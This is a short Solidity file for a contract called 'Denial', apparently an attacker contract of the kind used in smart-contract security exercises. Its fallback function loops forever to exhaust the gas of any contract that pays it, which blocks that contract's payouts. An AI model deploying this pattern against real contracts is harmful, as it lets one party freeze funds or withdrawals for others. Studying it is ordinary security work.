// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Denial {
    fallback() external payable {
        while (true) {}
    }
}
